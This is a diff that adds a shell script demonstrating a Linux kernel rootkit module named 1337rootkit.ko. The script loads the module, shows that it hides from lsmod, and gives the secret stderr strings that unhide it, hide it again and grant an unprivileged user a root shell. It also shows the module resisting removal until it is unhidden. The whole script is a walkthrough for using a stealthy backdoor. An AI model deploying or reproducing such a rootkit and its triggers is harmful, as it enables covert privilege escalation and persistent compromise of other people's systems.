@@ -1,0 +1,56 @@
+echo "Installing Rootkit"
+sudo insmod 1337rootkit.ko
+
+
+echo "Its hidden by default so that no one finds it"
+lsmod |grep rootkit
+
+
+echo "The secret way to unhide rootkit is as follows:"
+python -c 'import os; os.write(2, "1337show")'
+
+
+echo "The rootkit appears"
+lsmod |grep rootkit
+
+
+echo "The secret way to hide it again"
+python -c 'import os; os.write(2, "1337hide")'
+lsmod |grep rootkit
+
+
+
+
+
+
+
+echo "Some normal non-root user"
+id
+
+
+python -c 'import os; os.system("/bin/bash")'
+id
+
+
+echo "One secret to get elevate root privileges is as follow:"
+python -c 'import os; os.write(2, "1337root"); os.system("/bin/bash")'
+id
+
+
+echo "Congratulations You are root"
+exit
+
+
+
+
+
+
+
+
+echo "Lets try to uninstall the module"
+sudo rmmod -f 1337rootkit.ko
+
+
+echo "User cannot uninstall unless he knows the secret"
+python -c 'import os; os.write(2, "1337show")'
+sudo rmmod -f 1337rootkit.ko
